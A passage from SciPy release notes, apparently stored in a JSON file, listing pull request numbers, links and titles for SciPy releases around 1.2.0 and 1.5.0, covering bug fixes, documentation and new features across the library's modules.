ENH: scipy.sparse.random\n* `9050 <https://github.com/scipy/scipy/pull/9050>`__: BUG: scipy.io.hb_write: fails for matrices not in csc format\n* `9051 <https://github.com/scipy/scipy/pull/9051>`__: MAINT: Fix slow sparse.rand for k < mn/3 (#9036).\n* `9054 <https://github.com/scipy/scipy/pull/9054>`__: MAINT: spatial: Explicitly initialize LAPACK output parameters.\n* `9055 <https://github.com/scipy/scipy/pull/9055>`__: DOC: Add examples to scipy.special docstrings\n* `9056 <https://github.com/scipy/scipy/pull/9056>`__: ENH: Use one thread in OpenBLAS\n* `9059 <https://github.com/scipy/scipy/pull/9059>`__: DOC: Update README with link to Code of Conduct\n* `9060 <https://github.com/scipy/scipy/pull/9060>`__: BLD: remove support for the Bento build system.\n* `9062 <https://github.com/scipy/scipy/pull/9062>`__: DOC add sections to overview in scipy.stats\n* `9066 <https://github.com/scipy/scipy/pull/9066>`__: BUG: Correct \"remez\" error message\n* `9069 <https://github.com/scipy/scipy/pull/9069>`__: DOC: update linalg section of roadmap for LAPACK versions.\n* `9079 <https://github.com/scipy/scipy/pull/9079>`__: MAINT: add spatial.transform to refguide check; complete some...\n* `9081 <https://github.com/scipy/scipy/pull/9081>`__: MAINT: Add warnings if pivot value is close to tolerance in linprog(method='simplex')\n* `9084 <https://github.com/scipy/scipy/pull/9084>`__: BUG fix incorrect p-values of kurtosistest in scipy.stats\n* `9095 <https://github.com/scipy/scipy/pull/9095>`__: DOC: add sections to mstats overview in scipy.stats\n* `9096 <https://github.com/scipy/scipy/pull/9096>`__: BUG: Add test for Stackoverflow example from issue 8174.\n* `9101 <https://github.com/scipy/scipy/pull/9101>`__: ENH: add Siegel slopes (robust regression) to scipy.stats\n* `9105 <https://github.com/scipy/scipy/pull/9105>`__: allow resample_poly() to output float32 for float32 inputs.\n* `9112 <https://github.com/scipy/scipy/pull/9112>`__: MAINT: optimize: make trust-constr accept constraint dict (#9043)\n* `9118 <https://github.com/scipy/scipy/pull/9118>`__: Add doc entry to cholesky_banded\n* `9120 <https://github.com/scipy/scipy/pull/9120>`__: eigsh documentation parameters\n* `9125 <https://github.com/scipy/scipy/pull/9125>`__: interpolative: correctly reconstruct full rank matrices\n* `9126 <https://github.com/scipy/scipy/pull/9126>`__: MAINT: Use warnings for unexpected peak properties\n* `9129 <https://github.com/scipy/scipy/pull/9129>`__: BUG: Do not catch and silence KeyboardInterrupt\n* `9131 <https://github.com/scipy/scipy/pull/9131>`__: DOC: Correct the typo in scipy.optimize tutorial page\n* `9133 <https://github.com/scipy/scipy/pull/9133>`__: FIX: Avoid use of bare except\n* `9134 <https://github.com/scipy/scipy/pull/9134>`__: DOC: Update of 'return_eigenvectors' description\n* `9137 <https://github.com/scipy/scipy/pull/9137>`__: DOC: typo fixes for discrete Poisson tutorial\n* `9139 <https://github.com/scipy/scipy/pull/9139>`__: FIX: Doctest failure in optimize tutorial\n* `9143 <https://github.com/scipy/scipy/pull/9143>`__: DOC: missing sigma in Pearson r formula\n* `9145 <https://github.com/scipy/scipy/pull/9145>`__: MAINT: Refactor linear programming solvers\n* `9149 <https://github.com/scipy/scipy/pull/9149>`__: FIX: Make scipy.odr.ODR ifixx equal to its data.fix if given\n* `9156 <https://github.com/scipy/scipy/pull/9156>`__: DOC: special: Mention the sigmoid function in the expit docstring.\n* `9160 <https://github.com/scipy/scipy/pull/9160>`__: Fixed a latex delimiter error in levy()\n* `9170 <https://github.com/scipy/scipy/pull/9170>`__: DOC: correction / update of docstrings of distributions in scipy.stats\n* `9171 <https://github.com/scipy/scipy/pull/9171>`__: better description of the hierarchical clustering parameter\n* `9174 <https://github.com/scipy/scipy/pull/9174>`__: domain check for a < b in stats.truncnorm\n* `9175 <https://github.com/scipy/scipy/pull/9175>`__: DOC: Minor grammar fix\n* `9176 <https://github.com/scipy/scipy/pull/9176>`__: BUG: CloughTocher2DInterpolator: fix miscalculation at neighborless...\n* `9177 <https://github.com/scipy/scipy/pull/9177>`__: BUILD: Document the \"clean\" target in the doc/Makefile.\n* `9178 <https://github.com/scipy/scipy/pull/9178>`__: MAINT: make refguide-check more robust for printed numpy arrays\n* `9186 <https://github.com/scipy/scipy/pull/9186>`__: MAINT: Remove np.ediff1d occurence\n* `9188 <https://github.com/scipy/scipy/pull/9188>`__: DOC: correct typo in extending ndimage with C\n* `9190 <https://github.com/scipy/scipy/pull/9190>`__: ENH: Support specifying axes for fftconvolve\n* `9192 <https://github.com/scipy/scipy/pull/9192>`__: MAINT: optimize: fixed pv style suggestions from #9112\n* `9200 <https://github.com/scipy/scipy/pull/9200>`__: Fix make_interp_spline(..., k=0 or 1, axis<0)\n* `9201 <https://github.com/scipy/scipy/pull/9201>`__: BUG: sparse.linalg/gmres: use machine eps in breakdown check\n* `9204 <https://github.com/scipy/scipy/pull/9204>`__: MAINT: fix up stats.spearmanr and match mstats.spearmanr with...\n* `9206 <https://github.com/scipy/scipy/pull/9206>`__: MAINT: include benchmarks and dev files in sdist.\n* `9208 <https://github.com/scipy/scipy/pull/9208>`__: TST: signal: bump bsplines test tolerance for complex data\n* `9210 <https://github.com/scipy/scipy/pull/9210>`__: TST: mark tests as slow, fix missing random seed\n* `9211 <https://github.com/scipy/scipy/pull/9211>`__: ENH: add capability to specify orders in pade func\n* `9217 <https://github.com/scipy/scipy/pull/9217>`__: MAINT: Include ``success`` and ``nit`` in OptimizeResult returned...\n* `9222 <https://github.com/scipy/scipy/pull/9222>`__: ENH: interpolate: Use scipy.spatial.distance to speed-up Rbf\n* `9229 <https://github.com/scipy/scipy/pull/9229>`__: MNT: Fix Fourier filter double case\n* `9233 <https://github.com/scipy/scipy/pull/9233>`__: BUG: spatial/distance: fix pdist/cdist performance regression...\n* `9234 <https://github.com/scipy/scipy/pull/9234>`__: FIX: Proper suppression\n* `9235 <https://github.com/scipy/scipy/pull/9235>`__: BENCH: rationalize slow benchmarks + miscellaneous fixes\n* `9238 <https://github.com/scipy/scipy/pull/9238>`__: BENCH: limit number of parameter combinations in spatial.*KDTree...\n* `9239 <https://github.com/scipy/scipy/pull/9239>`__: DOC: stats: Fix LaTeX markup of a couple distribution PDFs.\n* `9241 <https://github.com/scipy/scipy/pull/9241>`__: ENH: Evaluate plateau size during peak finding\n* `9242 <https://github.com/scipy/scipy/pull/9242>`__: ENH: stats: Implement _ppf and _logpdf for crystalball, and do...\n* `9246 <https://github.com/scipy/scipy/pull/9246>`__: DOC: Properly render versionadded directive in HTML documentation\n* `9255 <https://github.com/scipy/scipy/pull/9255>`__: DOC: mention RootResults in optimization reference guide\n* `9260 <https://github.com/scipy/scipy/pull/9260>`__: TST: relax some tolerances so tests pass with x87 math\n* `9264 <https://github.com/scipy/scipy/pull/9264>`__: TST Use assert_raises \"match\" parameter instead of the \"message\"...\n* `9267 <https://github.com/scipy/scipy/pull/9267>`__: DOC: clarify expect() return val when moment is inf/nan\n* `9272 <https://github.com/scipy/scipy/pull/9272>`__: DOC: Add description of default bounds to linprog\n* `9277 <https://github.com/scipy/scipy/pull/9277>`__: MAINT: sparse/linalg: make test deterministic\n* `9278 <https://github.com/scipy/scipy/pull/9278>`__: MAINT: interpolate: pep8 cleanup in test_polyint\n* `9279 <https://github.com/scipy/scipy/pull/9279>`__: Fixed docstring for resample\n* `9280 <https://github.com/scipy/scipy/pull/9280>`__: removed first check for float in get_sum_dtype\n* `9281 <https://github.com/scipy/scipy/pull/9281>`__: BUG: only accept 1d input for bartlett / levene in scipy.stats\n* `9282 <https://github.com/scipy/scipy/pull/9282>`__: MAINT: dense_output and t_eval are mutually exclusive inputs\n* `9283 <https://github.com/scipy/scipy/pull/9283>`__: MAINT: add docs and do some cleanups in interpolate.Rbf\n* `9288 <https://github.com/scipy/scipy/pull/9288>`__: Run distance_transform_edt tests on all types\n* `9294 <https://github.com/scipy/scipy/pull/9294>`__: DOC: fix the formula typo\n* `9298 <https://github.com/scipy/scipy/pull/9298>`__: MAINT: optimize/trust-constr: restore .niter attribute for backward-compat\n* `9299 <https://github.com/scipy/scipy/pull/9299>`__: DOC: clarification of default rvs method in scipy.stats\n* `9301 <https://github.com/scipy/scipy/pull/9301>`__: MAINT: removed unused import sys\n* `9302 <https://github.com/scipy/scipy/pull/9302>`__: MAINT: removed unused imports\n* `9303 <https://github.com/scipy/scipy/pull/9303>`__: DOC: signal: Refer to fs instead of nyq in the firwin docstring.\n* `9305 <https://github.com/scipy/scipy/pull/9305>`__: ENH: Added Yeo-Johnson power transformation\n* `9306 <https://github.com/scipy/scipy/pull/9306>`__: ENH - add dual annealing\n* `9309 <https://github.com/scipy/scipy/pull/9309>`__: ENH add the yulesimon distribution to scipy.stats\n* `9317 <https://github.com/scipy/scipy/pull/9317>`__: Nested SLSQP bug fix.\n* `9320 <https://github.com/scipy/scipy/pull/9320>`__: MAINT: stats: avoid underflow in stats.geom.ppf\n* `9326 <https://github.com/scipy/scipy/pull/9326>`__: Add example for Rosenbrock function\n* `9332 <https://github.com/scipy/scipy/pull/9332>`__: Sort file lists\n* `9340 <https://github.com/scipy/scipy/pull/9340>`__: Fix typo in find_peaks documentation\n* `9343 <https://github.com/scipy/scipy/pull/9343>`__: MAINT Use np.full when possible\n* `9344 <https://github.com/scipy/scipy/pull/9344>`__: DOC: added examples to docstring of dirichlet class\n* `9346 <https://github.com/scipy/scipy/pull/9346>`__: DOC: Fix import of scipy.sparse.linalg in example (#9345)\n* `9350 <https://github.com/scipy/scipy/pull/9350>`__: Fix interpolate read only\n* `9351 <https://github.com/scipy/scipy/pull/9351>`__: MAINT: special.erf: use the x->-x symmetry\n* `9356 <https://github.com/scipy/scipy/pull/9356>`__: Fix documentation typo\n* `9358 <https://github.com/scipy/scipy/pull/9358>`__: DOC: improve doc for ksone and kstwobign in scipy.stats\n* `9362 <https://github.com/scipy/scipy/pull/9362>`__: DOC: Change datatypes of A matrices in linprog\n* `9364 <https://github.com/scipy/scipy/pull/9364>`__: MAINT: Adds implicit none to fftpack fortran sources\n* `9369 <https://github.com/scipy/scipy/pull/9369>`__: DOC: minor tweak to CoC (updated NumFOCUS contact address).\n* `9373 <https://github.com/scipy/scipy/pull/9373>`__: Fix exception if python is called with -OO option\n* `9374 <https://github.com/scipy/scipy/pull/9374>`__: FIX: AIX compilation issue with NAN and INFINITY\n* `9376 <https://github.com/scipy/scipy/pull/9376>`__: COBLYA -> COBYLA in docs\n* `9377 <https://github.com/scipy/scipy/pull/9377>`__: DOC: Add examples integrate: fixed_quad and quadrature\n* `9379 <https://github.com/scipy/scipy/pull/9379>`__: MAINT: TST: Make tests NumPy 1.8 compatible\n* `9385 <https://github.com/scipy/scipy/pull/9385>`__: CI: On Travis matrix \"OPTIMIZE=-OO\" flag ignored\n* `9387 <https://github.com/scipy/scipy/pull/9387>`__: Fix defaut value for 'mode' in 'ndimage.shift' in the doc\n* `9392 <https://github.com/scipy/scipy/pull/9392>`__: BUG: rank has to be integer in rank_filter: fixed issue 9388\n* `9399 <https://github.com/scipy/scipy/pull/9399>`__: DOC: Misc. typos\n* `9400 <https://github.com/scipy/scipy/pull/9400>`__: TST: stats: Fix the expected r-value of a linregress test.\n* `9405 <https://github.com/scipy/scipy/pull/9405>`__: BUG: np.hstack does not accept generator expressions\n* `9408 <https://github.com/scipy/scipy/pull/9408>`__: ENH: linalg: Shorter ill-conditioned warning message\n* `9418 <https://github.com/scipy/scipy/pull/9418>`__: DOC: Fix ndimage docstrings and reduce doc build warnings\n* `9421 <https://github.com/scipy/scipy/pull/9421>`__: DOC: Add missing docstring examples in scipy.spatial\n* `9422 <https://github.com/scipy/scipy/pull/9422>`__: DOC: Add an example to integrate.newton_cotes\n* `9427 <https://github.com/scipy/scipy/pull/9427>`__: BUG: Fixed defect with maxiter #9419 in dual annealing\n* `9431 <https://github.com/scipy/scipy/pull/9431>`__: BENCH: Add dual annealing to scipy benchmark (see #9415)\n* `9435 <https://github.com/scipy/scipy/pull/9435>`__: DOC: Add docstring examples for stats.binom_test\n* `9443 <https://github.com/scipy/scipy/pull/9443>`__: DOC: Fix the order of indices in optimize tutorial\n* `9444 <https://github.com/scipy/scipy/pull/9444>`__: MAINT: interpolate: use operator.index for checking/coercing...\n* `9445 <https://github.com/scipy/scipy/pull/9445>`__: DOC: Added missing example to stats.mstats.kruskal\n* `9446 <https://github.com/scipy/scipy/pull/9446>`__: DOC: Add note about version changed for jaccard distance\n* `9447 <https://github.com/scipy/scipy/pull/9447>`__: BLD: version-script handling in setup.py\n* `9448 <https://github.com/scipy/scipy/pull/9448>`__: TST: skip a problematic linalg test\n* `9449 <https://github.com/scipy/scipy/pull/9449>`__: TST: fix missing seed in lobpcg test.\n* `9456 <https://github.com/scipy/scipy/pull/9456>`__: TST: test_eigs_consistency() now sorts output\n\n\n==========================\n", "1.5.0": "-----------------------\n\n* `6510 <https://github.com/scipy/scipy/pull/6510>`__: Add Eigenvalue Range Functionality for Symmetric Eigenvalue Problems\n* `9525 <https://github.com/scipy/scipy/pull/9525>`__: BUG: SuperLU 'NATURAL' order applies a column permutation\n* `9634 <https://github.com/scipy/scipy/pull/9634>`__: Add the number of Jacobian evaluations to the output of L-BFGS-B.\n* `9719 <https://github.com/scipy/scipy/pull/9719>`__: ENH: Added kstwo probability distribution for two-sided one-sample...\n* `9783 <https://github.com/scipy/scipy/pull/9783>`__: WIP: optimize: added (dense) interpolative decomposition redundancy...\n* `10053 <https://github.com/scipy/scipy/pull/10053>`__: Adding docstring to weibull_min and weibull_max based on issue...\n* `10136 <https://github.com/scipy/scipy/pull/10136>`__: DEP: Add warning to linprog_verbose_callback\n* `10380 <https://github.com/scipy/scipy/pull/10380>`__: ENH: add geometric_slerp\n* `10602 <https://github.com/scipy/scipy/pull/10602>`__: MAINT: optimize: refactor common linprog arguments into namedtuple\n* `10648 <https://github.com/scipy/scipy/pull/10648>`__: Bounds for the Powell minimization method\n* `10673 <https://github.com/scipy/scipy/pull/10673>`__: ENH: approx_fprime --> approx_derivative\n* `10759 <https://github.com/scipy/scipy/pull/10759>`__: ENH: calculation of region areas in spatial.SphericalVoronoi\n* `10762 <https://github.com/scipy/scipy/pull/10762>`__: BENCH: optimize: more comprehensive linprog benchmarking\n* `10796 <https://github.com/scipy/scipy/pull/10796>`__: ENH exact p-values of wilcoxon test in scipy.stats\n* `10797 <https://github.com/scipy/scipy/pull/10797>`__: ENH: linalg: LU with full pivoting (wrappers for ?getc2/?gesc2)\n* `10824 <https://github.com/scipy/scipy/pull/10824>`__: ENH: Fast gaussian kernel estimator\n* `10942 <https://github.com/scipy/scipy/pull/10942>`__: BUG: prevent bound violation in L-BFGS-B optimize method\n* `11003 <https://github.com/scipy/scipy/pull/11003>`__: ENH: add scipy.linalg.convolution_matrix\n* `11023 <https://github.com/scipy/scipy/pull/11023>`__: improving error message for cubic-interpolate with duplicates\n* `11045 <https://github.com/scipy/scipy/pull/11045>`__: MAINT: make bdt{r,rc,ri}() functions accept double n,k args +...\n* `11063 <https://github.com/scipy/scipy/pull/11063>`__: Fix documentation error in optimize.minimize\n* `11069 <https://github.com/scipy/scipy/pull/11069>`__: ENH: stats.dlaplace.rvs improvements\n* `11071 <https://github.com/scipy/scipy/pull/11071>`__: DOC: Added examples to maximum_position in ndimage\n* `11075 <https://github.com/scipy/scipy/pull/11075>`__: DOC: Update stylistic consistency in multiple files\n* `11097 <https://github.com/scipy/scipy/pull/11097>`__: BUG: stats: fixing chisquare to return correct results for arrays...\n* `11110 <https://github.com/scipy/scipy/pull/11110>`__: ENH: special: Cythonise erfinv, erfcinv\n* `11112 <https://github.com/scipy/scipy/pull/11112>`__: BUG: special: Return NaN outside the domain of \\`eval_hermite\\`\n* `11114 <https://github.com/scipy/scipy/pull/11114>`__: BUG: special: fix \\`hyp1f1\\` for nonnegative integral \\`a\\` and...\n* `11115 <https://github.com/scipy/scipy/pull/11115>`__: DOC: special: add docstrings for \\`kei\\`, \\`ker\\`, \\`keip\\`,...\n* `11130 <https://github.com/scipy/scipy/pull/11130>`__: ENH: support for circular input\n* `11136 <https://github.com/scipy/scipy/pull/11136>`__: BUG: expm handling of empty input\n* `11138 <https://github.com/scipy/scipy/pull/11138>`__: DOC: stylistic consistency, punctuation, etc.\n* `11139 <https://github.com/scipy/scipy/pull/11139>`__: MAINT: cluster: use cython_blas, remove handwritten BLAS wrappers\n* `11146 <https://github.com/scipy/scipy/pull/11146>`__: DOC: update docs on bp parameter for detrend\n* `11151 <https://github.com/scipy/scipy/pull/11151>`__: DOC: special: add docstrings for \\`bei\\`, \\`ber\\`, \\`beip\\`,...\n* `11156 <https://github.com/scipy/scipy/pull/11156>`__: ENH: add input validation for ellipord.\n* `11157 <https://github.com/scipy/scipy/pull/11157>`__: DOC: stylistic revision, punctuation, consistency\n* `11160 <https://github.com/scipy/scipy/pull/11160>`__: ignore warning on 0 \\* inf in basin hopping\n* `11162 <https://github.com/scipy/scipy/pull/11162>`__: DOC: minor stylistic revision, undo changes\n* `11164 <https://github.com/scipy/scipy/pull/11164>`__: ENH/ BUG: Pydata sparse equality\n* `11171 <https://github.com/scipy/scipy/pull/11171>`__: Fix dtype validation of \"seuclidean\" metric V parameter\n* `11177 <https://github.com/scipy/scipy/pull/11177>`__: BUG: stats: Improve genpareto stats calculations.\n* `11180 <https://github.com/scipy/scipy/pull/11180>`__: MAINT: stats: Some clean up in test_distributions.py.\n* `11187 <https://github.com/scipy/scipy/pull/11187>`__: ENH: add functionality log_softmax to SciPy.special.\n* `11188 <https://github.com/scipy/scipy/pull/11188>`__: MAINT: add rvs method to argus in scipy.stats\n* `11196 <https://github.com/scipy/scipy/pull/11196>`__: DOC: special: add to docstrings of Kelvin zeros functions\n* `11202 <https://github.com/scipy/scipy/pull/11202>`__: BUG: fix edge counting in shortest_path\n* `11218 <https://github.com/scipy/scipy/pull/11218>`__: BUG: scipy/interpolate: fix PPoly/Cubic\\*Spline roots() extrapolation...\n* `11225 <https://github.com/scipy/scipy/pull/11225>`__: Add a warning to constant input for spearmanr() function\n* `11226 <https://github.com/scipy/scipy/pull/11226>`__: Speed up of interior-point method for cholesky solver\n* `11229 <https://github.com/scipy/scipy/pull/11229>`__: BUG: Explicit dtype specification in _upfirdn.py\n* `11230 <https://github.com/scipy/scipy/pull/11230>`__: Additional citation for optimize tutorial\n* `11231 <https://github.com/scipy/scipy/pull/11231>`__: Adds SLSQP test for duplicate f-evals (#10738)\n* `11236 <https://github.com/scipy/scipy/pull/11236>`__: MAINT: Improved error message for Wn range in iirfilter.\n* `11245 <https://github.com/scipy/scipy/pull/11245>`__: ENH: optimize: dense redundancy removal routine optimizations\n* `11247 <https://github.com/scipy/scipy/pull/11247>`__: MAINT: Remove _lib/_numpy_compat.py\n* `11248 <https://github.com/scipy/scipy/pull/11248>`__: BUG: rv_discrete.ppf() to handle loc\n* `11251 <https://github.com/scipy/scipy/pull/11251>`__: DOC: add reference for linesearch zoom algorithm\n* `11253 <https://github.com/scipy/scipy/pull/11253>`__: BUG: fix kendalltau issue where p-value becomes >1\n* `11254 <https://github.com/scipy/scipy/pull/11254>`__: MAINT: make special.factorial handle nan correctly\n* `11256 <https://github.com/scipy/scipy/pull/11256>`__: DOC: Updated documentation for scipy.linalg.qr\n* `11265 <https://github.com/scipy/scipy/pull/11265>`__: Fix: Can no longer slice csr_matrix in 1.3.0\n* `11267 <https://github.com/scipy/scipy/pull/11267>`__: BUG: Rework the scaling in the ks_2samp two-sided exact test.\n* `11268 <https://github.com/scipy/scipy/pull/11268>`__: DOC: example of NonLinearConstraint\n* `11269 <https://github.com/scipy/scipy/pull/11269>`__: Fix: Sparse matrix constructor data type detection changes on...\n* `11276 <https://github.com/scipy/scipy/pull/11276>`__: BLD: update minimum Python, NumPy, Cython, Pybind11 versions\n* `11277 <https://github.com/scipy/scipy/pull/11277>`__: MAINT: Cleanup conditionals for unsupported numpy verisons\n* `11278 <https://github.com/scipy/scipy/pull/11278>`__: MAINT: Cleanup stats.iqr workarounds for unsupported NumPy versions\n* `11282 <https://github.com/scipy/scipy/pull/11282>`__: TST/CI: improve traceback formatting for test failures\n* `11284 <https://github.com/scipy/scipy/pull/11284>`__: fix docs & behavior for mode sequences in ndimage filters\n* `11285 <https://github.com/scipy/scipy/pull/11285>`__: DOC: special: complete the docstrings of Chi-square functions\n* `11286 <https://github.com/scipy/scipy/pull/11286>`__: BUG: make loadmat/savemat file opening close resources correctly\n* `11287 <https://github.com/scipy/scipy/pull/11287>`__: CI: skip Azure and TravisCI builds on merges and direct pushes...\n* `11288 <https://github.com/scipy/scipy/pull/11288>`__: DOC: Fix import in scipy.io.wavfile.read sample code\n* `11289 <https://github.com/scipy/scipy/pull/11289>`__: BUG: Use context manager for open\n* `11290 <https://github.com/scipy/scipy/pull/11290>`__: MAINT: Remove _lib._version in favour of _lib._pep440\n* `11292 <https://github.com/scipy/scipy/pull/11292>`__: DOC: special: add docstrings for various convenience functions\n* `11293 <https://github.com/scipy/scipy/pull/11293>`__: DOC: special: fix typo in \\`chdtri\\` docstring\n* `11296 <https://github.com/scipy/scipy/pull/11296>`__: DOC: special: add to docstrings of Bessel zeros and derivatives\n* `11297 <https://github.com/scipy/scipy/pull/11297>`__: DOC: special: add parameters/returns sections for Bessel integrals\n* `11300 <https://github.com/scipy/scipy/pull/11300>`__: MAINT: Update vendored uarray version\n* `11301 <https://github.com/scipy/scipy/pull/11301>`__: CI: azure conditions should require succeeded()\n* `11302 <https://github.com/scipy/scipy/pull/11302>`__: ENH: build infrastructure for ILP64 BLAS + ARPACK conversion\n* `11303 <https://github.com/scipy/scipy/pull/11303>`__: DOC: special: fix typo in \\`besselpoly\\` docstring\n* `11304 <https://github.com/scipy/scipy/pull/11304>`__: ENH: MAINT: Rewrite of eigh() and relevant wrappers\n* `11306 <https://github.com/scipy/scipy/pull/11306>`__: TST: skip test_aligned_mem linalg test that is crashing on ppcle64\n* `11307 <https://github.com/scipy/scipy/pull/11307>`__: MAINT: Fix typo 'solutuion' -> 'solution'\n* `11308 <https://github.com/scipy/scipy/pull/11308>`__: ENH: do not create 1d array out of a scalar\n* `11310 <https://github.com/scipy/scipy/pull/11310>`__: MAINT: clean up object array creation, scalar/1d confusion\n* `11311 <https://github.com/scipy/scipy/pull/11311>`__: DOC: Specify custom callable option for metric in cluster.hierarchy.fclusterdata\n* `11316 <https://github.com/scipy/scipy/pull/11316>`__: BUG: special: fix behavior for \\`rgamma\\` zeros\n* `11317 <https://github.com/scipy/scipy/pull/11317>`__: BUG: fix floating-point literal comparisons under C99\n* `11318 <https://github.com/scipy/scipy/pull/11318>`__: TST: optimize: mark two linprog tests for skipping\n* `11320 <https://github.com/scipy/scipy/pull/11320>`__: BUG: Include \\`int64_t\\` declaration to \\`rectangular_lsap.cpp\\`\n* `11330 <https://github.com/scipy/scipy/pull/11330>`__: MAINT: Update vendored pypocketfft version\n* `11333 <https://github.com/scipy/scipy/pull/11333>`__: BUG: directed_hausdorff subset fix\n* `11335 <https://github.com/scipy/scipy/pull/11335>`__: [ENH] sparse: Loosen check for sparse outer indexing fast path\n* `11337 <https://github.com/scipy/scipy/pull/11337>`__: Undefined name 'e' in pavement.py\n* `11338 <https://github.com/scipy/scipy/pull/11338>`__: scipyoptdoc.py: Remove unused variable 'sixu'\n* `11340 <https://github.com/scipy/scipy/pull/11340>`__: xrange() was removed in Python 3 in favor of range()\n* `11342 <https://github.com/scipy/scipy/pull/11342>`__: range() was removed in Py3 in _binned_statistic.py\n* `11343 <https://github.com/scipy/scipy/pull/11343>`__: BUG: constants: fix 'exact' values table\n* `11347 <https://github.com/scipy/scipy/pull/11347>`__: ENH: add input validation function and apply it to needed functions\n* `11348 <https://github.com/scipy/scipy/pull/11348>`__: MAINT: remove six.string_types usages\n* `11349 <https://github.com/scipy/scipy/pull/11349>`__: MAINT: minor doc fix _minimize_trustregion_constr\n* `11353 <https://github.com/scipy/scipy/pull/11353>`__: MAINT: py3 remove various six usages\n* `11358 <https://github.com/scipy/scipy/pull/11358>`__: ENH: optimize: Use CSR format instead of LIL for speed\n* `11362 <https://github.com/scipy/scipy/pull/11362>`__: MAINT: sys.version_info >= 3.5\n* `11364 <https://github.com/scipy/scipy/pull/11364>`__: ENH: cache square of sums for f_oneway\n* `11368 <https://github.com/scipy/scipy/pull/11368>`__: ENH: add optional argument, \"include_nyquist\", for freqz()\n* `11372 <https://github.com/scipy/scipy/pull/11372>`__: BENCH: optimize: added linprog presolve benchmarks\n* `11376 <https://github.com/scipy/scipy/pull/11376>`__: ENH: Add wrapper for ?gttrf/?gttrs\n* `11377 <https://github.com/scipy/scipy/pull/11377>`__: MAINT: Remove Python 2 code from tools/authors.py\n* `11378 <https://github.com/scipy/scipy/pull/11378>`__: ENH (WIP): Python wrapper for ?tbtrs\n* `11379 <https://github.com/scipy/scipy/pull/11379>`__: MAINT: Remove six.with_metaclass from benchmarks/cython_special.py\n* `11380 <https://github.com/scipy/scipy/pull/11380>`__: BUG: sparse/isolve: bicg and qmr don't treat x0 correctly\n* `11382 <https://github.com/scipy/scipy/pull/11382>`__: MAINT: remove error throw in binned_statistic_dd() on non-finite...\n* `11383 <https://github.com/scipy/scipy/pull/11383>`__: MAINT: _lib: remove py2 compat shims in getargspec\n* `11384 <https://github.com/scipy/scipy/pull/11384>`__: MAINT: Use numpy scalar types directly\n* `11385 <https://github.com/scipy/scipy/pull/11385>`__: ENH: special: add spherical Bessel functions to \\`cython_special\\`\n* `11389 <https://github.com/scipy/scipy/pull/11389>`__: MAINT: line.startswith shouldn't be bytes\n* `11393 <https://github.com/scipy/scipy/pull/11393>`__: ENH: Speed up truncnorm's ppf()and rvs() methods\n* `11394 <https://github.com/scipy/scipy/pull/11394>`__: MAINT: Remove self._size (and self._random_state) from stats...\n* `11395 <https://github.com/scipy/scipy/pull/11395>`__: correction in error message (%d->%g format)\n* `11396 <https://github.com/scipy/scipy/pull/11396>`__: DOC: revert gh10540, removing mtrand\n* `11397 <https://github.com/scipy/scipy/pull/11397>`__: MAINT: differential_evolution accepts np.random.Generator\n* `11402 <https://github.com/scipy/scipy/pull/11402>`__: ENH: stats can use np.random.Generator\n* `11404 <https://github.com/scipy/scipy/pull/11404>`__: ENH: add docstring of butter() for transfer function syntax problem\n* `11405 <https://github.com/scipy/scipy/pull/11405>`__: DOC: Fix \"see also\" for SmoothBivariateSpline\n* `11408 <https://github.com/scipy/scipy/pull/11408>`__: ENH: Add a \\`plan\\` argument to FFT functions in \\`scipy.fft\\`\n* `11411 <https://github.com/scipy/scipy/pull/11411>`__: MAINT: check minimize duplicate evaluations\n* `11418 <https://github.com/scipy/scipy/pull/11418>`__: ENH: Linalg: Python wrapper for ?geqrfp\n* `11419 <https://github.com/scipy/scipy/pull/11419>`__: TST: Python 3.7 mac OS gcc multibuild fix\n* `11423 <https://github.com/scipy/scipy/pull/11423>`__: ENH: Add tool to lint diffs\n* `11425 <https://github.com/scipy/scipy/pull/11425>`__: FIX: _array_newton should preserve complex inputs\n* `11426 <https://github.com/scipy/scipy/pull/11426>`__: MAINT: licence for global optimization benchmarks\n* `11431 <https://github.com/scipy/scipy/pull/11431>`__: Make median_absolute_deviation scale argument aligned w/iqr\n* `11432 <https://github.com/scipy/scipy/pull/11432>`__: Fix error message typo\n* `11433 <https://github.com/scipy/scipy/pull/11433>`__: DOC: Remove L from longs\n* `11434 <https://github.com/scipy/scipy/pull/11434>`__: MAINT: Python3 improvements to refguide_check.py\n* `11435 <https://github.com/scipy/scipy/pull/11435>`__: DOC: Update runtest --parallel help\n* `11436 <https://github.com/scipy/scipy/pull/11436>`__: MAINT: Remove checks for sys.version < 3.5\n* `11437 <https://github.com/scipy/scipy/pull/11437>`__: DOC: Fix documentation issue\n* `11439 <https://github.com/scipy/scipy/pull/11439>`__: Support path objects (PEP 519) in mmio functions\n* `11440 <https://github.com/scipy/scipy/pull/11440>`__: correct bounds pass in run_dualannealing for benchmarks/optimize.py\n* `11443 <https://github.com/scipy/scipy/pull/11443>`__: BENCH: optimize_linprog remove ImportError exception\n* `11453 <https://github.com/scipy/scipy/pull/11453>`__: BUG: sparse: convert csc/csr indices to int64 as needed\n* `11454 <https://github.com/scipy/scipy/pull/11454>`__: DOC: Remove caveat on \\`maximum_bipartite_matching\\`\n* `11455 <https://github.com/scipy/scipy/pull/11455>`__: BUG: Fix _lib._util.getargspec_no_self lack of KEYWORD_ONLY support.\n* `11456 <https://github.com/scipy/scipy/pull/11456>`__: Implementation of khatri_rao product\n* `11459 <https://github.com/scipy/scipy/pull/11459>`__: BUG: fix augmentation being broken in maximum_bipartite_matching\n* `11461 <https://github.com/scipy/scipy/pull/11461>`__: MAINT: minor spelling corrections in comments in SciPy.sparse.linalg.arpack\n* `11467 <https://github.com/scipy/scipy/pull/11467>`__: [MRG] Make result data type of KDE evaluation like in the input...\n* `11469 <https://github.com/scipy/scipy/pull/11469>`__: Update integrate.quad documentation\n* `11472 <https://github.com/scipy/scipy/pull/11472>`__: Fixed result typo\n* `11476 <https://github.com/scipy/scipy/pull/11476>`__: DOC: stats: Copy-edit the anderson docstring.\n* `11478 <https://github.com/scipy/scipy/pull/11478>`__: ENH: avoid unnecessary array copies in matrix product\n* `11481 <https://github.com/scipy/scipy/pull/11481>`__: BUG: Make special.hyperu return nan if any argument is nan\n* `11483 <https://github.com/scipy/scipy/pull/11483>`__: BUG: Fixed \\`_kpp\\` initialization on \\`scipy.cluster.vq\\`, closing...\n* `11485 <https://github.com/scipy/scipy/pull/11485>`__: ENH: Update docstring of class KrylovJacobian to fix #2744\n* `11486 <https://github.com/scipy/scipy/pull/11486>`__: BUG: make special.eval_hermite return nan if second argument...\n* `11487 <https://github.com/scipy/scipy/pull/11487>`__: ENH: improve docstring of correlate and correlate2d to fix #1968\n* `11488 